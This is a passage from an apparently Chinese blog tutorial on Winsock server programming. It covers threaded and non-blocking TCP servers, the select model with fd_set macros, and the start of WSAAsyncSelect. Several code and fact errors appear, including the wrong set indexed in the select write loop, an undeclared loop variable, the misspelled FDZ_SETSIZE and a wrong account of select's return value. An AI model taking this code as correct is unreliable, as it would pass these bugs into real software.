<h5 id="服务端-3"><a href="#服务端-3" class="headerlink" title="服务端"></a>服务端</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数，处理客户端连接</span></span><br><span class="line"><span class="type">unsigned</span> __stdcall <span class="title function_">ClientThread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    SOCKET client_socket = *(SOCKET *)arg;</span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from server&quot;</span>;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收数据</span></span><br><span class="line">    iResult = recv(client_socket, buffer, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Connection closing...\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据</span></span><br><span class="line">    send(client_socket, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    closesocket(client_socket);</span><br><span class="line">    <span class="built_in">free</span>(arg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定本地地址和监听</span></span><br><span class="line">SOCKET <span class="title function_">Bind_Listen</span><span class="params">(<span class="type">int</span> nBacklog)</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET server_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">address</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((server_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定socket到端口</span></span><br><span class="line">    address.sin_family = AF_INET;</span><br><span class="line">    address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, <span class="keyword">sizeof</span>(address)) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind failed&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听</span></span><br><span class="line">    <span class="keyword">if</span> (listen(server_fd, nBacklog) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;listen&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> server_fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务器主体</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyTepSerFun</span><span class="params">()</span> &#123;</span><br><span class="line">    SOCKET server_fd = Bind_Listen(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (server_fd == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_addr</span>;</span></span><br><span class="line">        <span class="type">int</span> addrlen = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">        SOCKET *client_socket = (SOCKET *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SOCKET));</span><br><span class="line">        *client_socket = accept(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;addrlen);</span><br><span class="line">        <span class="keyword">if</span> (*client_socket == INVALID_SOCKET) &#123;</span><br><span class="line">            perror(<span class="string">&quot;accept&quot;</span>);</span><br><span class="line">            <span class="built_in">free</span>(client_socket);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建线程处理客户端连接</span></span><br><span class="line">        _beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, ClientThread, (<span class="type">void</span> *)client_socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    closesocket(server_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    MyTepSerFun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="非阻塞式"><a href="#非阻塞式" class="headerlink" title="非阻塞式"></a>非阻塞式</h2><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数，处理客户端连接</span></span><br><span class="line"><span class="type">unsigned</span> __stdcall <span class="title function_">ClientThread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    SOCKET client_socket = *(SOCKET *)arg;</span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from server&quot;</span>;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置为非阻塞模式</span></span><br><span class="line">    u_long iMode = <span class="number">1</span>;</span><br><span class="line">    iResult = ioctlsocket(client_socket, FIONBIO, &amp;iMode);</span><br><span class="line">    <span class="keyword">if</span> (iResult != NO_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ioctlsocket failed&quot;</span>);</span><br><span class="line">        closesocket(client_socket);</span><br><span class="line">        <span class="built_in">free</span>(arg);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 接收数据</span></span><br><span class="line">        iResult = recv(client_socket, buffer, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">            <span class="comment">// 发送数据</span></span><br><span class="line">            send(client_socket, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Connection closing...\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (WSAGetLastError() == WSAEWOULDBLOCK) &#123;</span><br><span class="line">                <span class="comment">// 没有数据可读，继续循环</span></span><br><span class="line">                Sleep(<span class="number">100</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    closesocket(client_socket);</span><br><span class="line">    <span class="built_in">free</span>(arg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定本地地址和监听</span></span><br><span class="line">SOCKET <span class="title function_">Bind_Listen</span><span class="params">(<span class="type">int</span> nBacklog)</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET server_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">address</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((server_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定socket到端口</span></span><br><span class="line">    address.sin_family = AF_INET;</span><br><span class="line">    address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, <span class="keyword">sizeof</span>(address)) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind failed&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听</span></span><br><span class="line">    <span class="keyword">if</span> (listen(server_fd, nBacklog) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;listen&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> server_fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务器主体</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyTepSerFun</span><span class="params">()</span> &#123;</span><br><span class="line">    SOCKET server_fd = Bind_Listen(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (server_fd == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_addr</span>;</span></span><br><span class="line">        <span class="type">int</span> addrlen = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">        SOCKET *client_socket = (SOCKET *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SOCKET));</span><br><span class="line">        *client_socket = accept(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;addrlen);</span><br><span class="line">        <span class="keyword">if</span> (*client_socket == INVALID_SOCKET) &#123;</span><br><span class="line">            <span class="keyword">if</span> (WSAGetLastError() == WSAEWOULDBLOCK) &#123;</span><br><span class="line">                <span class="comment">// 没有连接请求，继续循环</span></span><br><span class="line">                Sleep(<span class="number">100</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                perror(<span class="string">&quot;accept&quot;</span>);</span><br><span class="line">                <span class="built_in">free</span>(client_socket);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建线程处理客户端连接</span></span><br><span class="line">        _beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, ClientThread, (<span class="type">void</span> *)client_socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    closesocket(server_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    MyTepSerFun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Select模型"><a href="#Select模型" class="headerlink" title="Select模型"></a>Select模型</h2><p>Select模型对应的是一个函数</p>
<p>从字面意思理解，<strong>select可从诸多连接中检测出可读的（accpet函数），也就是有响应的连接；也可以从诸多连接中检测出可写的（recv、send函数），也就是可以发送消息的连接。</strong></p>
<img src="/2024/07/05/CInternet/image-20240717223748067.png" alt="image-20240717223748067" style="zoom: 50%;">

<h3 id="select模型逻辑"><a href="#select模型逻辑" class="headerlink" title="select模型逻辑"></a>select模型逻辑</h3><p>select模型逻辑步骤如下：</p>
<ol>
<li>将所有的socket装进一个数组中</li>
<li>通过select函数遍历socket数组，取出有响应（可读、可写）的socket放进另一个数组</li>
<li>对存入有响应的socket数组处理</li>
</ol>
<h3 id="函数和结构体"><a href="#函数和结构体" class="headerlink" title="函数和结构体"></a>函数和结构体</h3><p>Select函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">select</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">int</span> nfds, 		<span class="comment">//直接为0</span></span></span><br><span class="line"><span class="params">    fd_set *readfds, <span class="comment">//套接字集合，针对读操作accept, recv</span></span></span><br><span class="line"><span class="params">    fd_set *writefds,<span class="comment">//针对写操作，如connect send等</span></span></span><br><span class="line"><span class="params">    fd_set *exceptfds,<span class="comment">//针对异常</span></span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> timeval *timeout<span class="comment">//超时设置，为NULL就是一直等</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>返回值 1，如果超时，返回值 0，出现错误，返回值Socket_ERROR</p>
<p>fd_set结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">fd_set</span>&#123;</span></span><br><span class="line">    u_int fd_count; <span class="comment">/* How many SET */</span></span><br><span class="line">    SOCKET fd_array[FD_SETSIZE]; <span class="comment">/* An array of SOCKETs*/</span></span><br><span class="line">&#125;fd_set;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FDZ_SETSIZE 64</span></span><br></pre></td></tr></table></figure>

<p>因为<code>#define FDZ_SETSIZE 64</code>所以最大不能超过64个，代表着可以并发处理64个套接字</p>
<p>如果想装更多的socket，可以通过在<strong>winsock2.h头文件前声明宏</strong>，给一个更大的值：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FD_SETSIZE 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>四个操作fd_set的操作宏</strong></p>
<table>
<thead>
<tr>
<th>操作宏</th>
<th>作用</th>
<th>代码</th>
</tr>
</thead>
<tbody><tr>
<td>FD_ZERO</td>
<td>将客户端socket集合清零</td>
<td><code>FD_ZERO(&amp;clientSockets);</code></td>
</tr>
<tr>
<td>FD_SET</td>
<td>添加一个socket(超过默认值大小不再处理)</td>
<td><code>FD_SET(socketListen, &amp;clientSockets);</code></td>
</tr>
<tr>
<td>FD_CLR</td>
<td>从集合中删除指定的socket一定要close，手动释放</td>
<td><code>FD_CLR(socketListen,&amp;clientSockets);</code><br><code>closesocket(socketListen);</code></td>
</tr>
<tr>
<td>FD_ISSET</td>
<td>查询socket是否在集合中，不存在返回0，存在返回非0</td>
<td><code>FD_ISSET(socketListen, &amp;clientSockets);</code></td>
</tr>
</tbody></table>
<p>getsockopt函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getsockopt</span><span class="params">(</span></span><br><span class="line"><span class="params">    SOCKET s;<span class="comment">//套接字</span></span></span><br><span class="line"><span class="params">    <span class="type">int</span> level;<span class="comment">//选顶的等级包括SOL_SOCKET IPPROTO_TCP</span></span></span><br><span class="line"><span class="params">    <span class="type">int</span> optname;<span class="comment">//SOCKET选顶的名称SO_ERROR SO_ACCEPTCONN</span></span></span><br><span class="line"><span class="params">    <span class="type">char</span> FAR *optval;<span class="comment">//用于接收的缓冲区</span></span></span><br><span class="line"><span class="params">    <span class="type">int</span> FAR *optlen <span class="comment">//大小</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>成功返回0；失败返回SOCKET_ERROR</p>
<h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 0. 初始化</span></span><br><span class="line">    WORD wsVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    WSADATA wsaData = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    WSAStartup(wsVersion, &amp;wsaData);</span><br><span class="line">    <span class="comment">// 1. 创建套接字</span></span><br><span class="line">    SOCKET sSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == sSocket) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;套接字闯创建失败!\n&quot;</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;套接字闯创建成功!\n&quot;</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 绑定套接字</span></span><br><span class="line">    sockaddr_in sockAddrInfo = &#123;<span class="number">0</span>&#125;;    <span class="comment">// 初始化</span></span><br><span class="line">    sockAddrInfo.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    sockAddrInfo.sin_port = htons(<span class="number">2118</span>); <span class="comment">// 端口</span></span><br><span class="line">    sockAddrInfo.sin_family = AF_INET; <span class="comment">// 地址族规范</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> bRes = bind(sSocket, (sockaddr*)&amp;sockAddrInfo, <span class="keyword">sizeof</span>(sockAddrInfo));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == bRes) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;绑定失败!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;绑定成功!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 监听套接字</span></span><br><span class="line">    <span class="type">int</span> lRes = listen(sSocket, <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == lRes) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;监听失败!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;监听成功!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd_set fdSocket; <span class="comment">// 定义</span></span><br><span class="line">    FD_ZERO(&amp;fdSocket); <span class="comment">// 初始化</span></span><br><span class="line">    FD_SET(sSocket, &amp;fdSocket); <span class="comment">// 将当前服务器创建的socket放入集合中</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        fd_set readfds = fdSocket; <span class="comment">// 定义可读的集合</span></span><br><span class="line">        fd_set writefds = fdSocket; <span class="comment">// 定义可写的集合</span></span><br><span class="line">        <span class="comment">// fd_set exceptfds = fdSocket;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取select函数的返回值</span></span><br><span class="line">        <span class="type">int</span> iRes = select(<span class="number">0</span>, &amp;readfds, &amp;writefds, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 如果返回值大于0则说明不存在无响应、错误的情况，继续向下</span></span><br><span class="line">        <span class="keyword">if</span> (iRes &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 遍历可写集合，给每个socket发送Hello</span></span><br><span class="line">            <span class="keyword">for</span> (u_int i = <span class="number">0</span>; i &lt; writefds.fd_count; i++) &#123;</span><br><span class="line">                send(readfds.fd_array[i], <span class="string">&quot;Hello&quot;</span>, <span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历可读集合</span></span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; readfds.fd_count; i++) &#123;</span><br><span class="line">                <span class="comment">// 如果socket为当前服务器创建的scoket则进入accept等待消息</span></span><br><span class="line">                <span class="keyword">if</span> (readfds.fd_array[i] == sSocket) &#123;</span><br><span class="line">                    sockaddr_in s = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">                    <span class="type">int</span> l = <span class="keyword">sizeof</span>(s);</span><br><span class="line">                    SOCKET aSocket = accept(sSocket, (sockaddr*)&amp;s, &amp;l);</span><br><span class="line">                    <span class="keyword">if</span> (INVALID_SOCKET == aSocket)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    FD_SET(aSocket, &amp;fdSocket);</span><br><span class="line">                    <span class="comment">// inet_ntoa获取IP</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Accpet Client IP: %s \n&quot;</span>, inet_ntoa(s.sin_addr));</span><br><span class="line">                    <span class="comment">// 如果不是，则进入接收消息</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">char</span> buf[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">                    <span class="type">int</span> iRecv = recv(readfds.fd_array[i], buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">                    <span class="comment">// 判断接收消息的返回值，大于0则表示接收成功。</span></span><br><span class="line">                    <span class="keyword">if</span> (iRecv &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Recv: %s \n&quot;</span>, buf);</span><br><span class="line">                        <span class="comment">// 否则就关闭连接、关闭套接字</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        SOCKET tSocket = readfds.fd_array[i];</span><br><span class="line">                        FD_CLR(tSocket, &amp;fdSocket);</span><br><span class="line">                        shutdown(tSocket, SD_BOTH);</span><br><span class="line">                        closesocket(tSocket);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    closesocket(sSocket);</span><br><span class="line"></span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="WSAAsyncSelect模型"><a href="#WSAAsyncSelect模型" class="headerlink" title="WSAAsyncSelect模型"></a>WSAAsyncSelect模型</h2><p>WSAAsyncSelect模式允许以windows消息的形式接收网络事件通知。这个模式是为了适应windows消息驱动环境而设置的，对性能要求不高的网络应用程序可采用此模式。</p>
<p>优缺点：WSAAsyncSelect模型最突出的特点是<strong>与windows的消息驱动机制融在了一起</strong>，这使得<strong>开发带GUI界面的网络程序</strong>变得很简单。但是如果连接增加，单个WINDOWS函数处理上千个客户请求时，服务器性能势必发受到影响。</p>
<p>WSAAsyncSelect()函数自动把套接字设为非阻塞模式，并且为套接字绑定一个窗口句柄，当有网络事件发生时，便向这个窗口发送消息。</p>
<p>语法：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> WSAAPI <span class="title">WSAAsyncSelect</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] SOCKET s, 		<span class="comment">//标识需要事件通知的套接字的描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] HWND   hWnd,	<span class="comment">//标识在发生网络事件时接收消息的窗口的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] u_int  wMsg,	<span class="comment">//发生网络事件时要接收的消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] <span class="type">long</span>   lEvent	<span class="comment">//位掩码，指定应用程序感兴趣的网络事件的组合</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>  <strong>lEvent</strong>参数:</p>
<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>FD_READ</td>
<td>欲接收 读准备好 的通知.</td>
</tr>
<tr>
<td>FD_WRITE</td>
<td>欲接收 写准备好 的通知.</td>
</tr>
<tr>
<td>FD_OOB</td>
<td>欲接收 带边数据到达 的通知.</td>
</tr>
<tr>
<td>FD_ACCEPT</td>
